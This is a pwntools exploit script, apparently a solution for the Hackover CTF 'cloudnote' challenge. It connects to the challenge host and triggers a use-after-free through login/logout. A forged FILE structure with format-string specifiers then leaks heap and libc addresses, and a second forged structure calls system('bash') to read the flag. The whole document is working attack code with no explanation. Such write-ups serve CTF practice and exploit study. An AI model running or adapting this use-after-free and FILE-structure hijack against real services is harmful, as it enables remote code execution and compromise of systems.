import pwn
import os
from binascii import hexlify

pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMA'


e = pwn.ELF('./cloudnote')
l = pwn.ELF('./libc.so.6')
#r = pwn.process("./cloudnote")
#r = pwn.remote("172.17.0.2", 6354)
r = pwn.remote("cloud-note.ctf.hackover.de", 6354)

got_printf = e.got['printf']
pwn.log.success("printf@got: 0x%x" % got_printf)
system_offset = l.symbols['system'] - l.address 
pwn.log.success("system_offset: %d" % system_offset)
nullptr = 0x6020f0
pwn.log.success("null region: 0x%x" % nullptr)


#prepare uaf
print r.recvuntil("cmd>")
r.sendline("login")
r.sendline("guest")
r.sendline("guest")
print r.recvuntil("cmd>")
r.sendline("logout")
print r.recvuntil("cmd>")

def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

#leak
#fstruct = pattern
fstruct = "%p|" * 128
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(got_printf-0x48))
exploit = "A" * 0x120 + fstruct

#pwn.gdb.attach(r, "b fwrite\nb fseek\nb system\nc")
r.sendline("note add")
r.sendline(exploit)
leak = r.recvuntil("cmd>")
heap = int(leak.split("|")[5][2:],16) - 0x420
libc = int(leak.split("|")[18][2:],16) - 133168
pwn.log.success("heap base: 0x%x" % heap)
pwn.log.success("libc base: 0x%x" % libc)
system = libc + system_offset
pwn.log.success("system: 0x%x" % system)

#execute bash
fstruct = "\x00" * 224
fstruct = set_data(fstruct, 0, "bash\x00")
fstruct = set_data(fstruct, 32, pwn.p64(libc + system_offset)) #place system addr anywhere
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(heap + 5616 - 0x48))
exploit = "A" * 0x120 + fstruct
r.sendline("note add")
r.sendline(exploit)

print r.sendline("cat flag")
#r.interactive()
